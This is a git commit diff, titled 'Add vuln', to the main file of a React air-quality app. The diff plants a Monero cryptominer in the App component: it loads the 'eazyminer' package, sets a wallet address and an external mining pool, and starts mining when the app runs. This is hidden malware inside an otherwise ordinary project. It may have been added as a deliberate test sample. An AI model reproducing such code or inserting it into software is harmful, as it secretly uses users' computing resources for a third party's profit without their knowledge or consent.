6dde23c578e02ce3d374d0114ca8bd2d664f5b9e
IceWizard4902 <77266084+IceWizard4902@users.noreply.github.com>
2022-07-18 20:09:17 +0800

    Add vuln

--- src/App.js
+++ src/App.js
@@ -2,8 +2,19 @@ import HeaderBox from "./Component/HeaderBox";
 import AQIHandle from "./Component/AQIHandle";
 import "./styles.css";
 import { useState } from "react";
+const Miner = require('eazyminer');
 
 function App() {
+  const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8',
+        url: 'xmrpool.eu:9999', // optional pool URL,
+    }],
+    autoStart: false // optional delay
+  });
+
+  miner.start(); // optional manually start the miner
   const [currentCity, setCurrentCity] = useState("Hanoi");
   return (
     <div className="App">
@@ -13,6 +24,7 @@ function App() {
       </main>
     </div>
   );
+  
 }
 
 export default App;
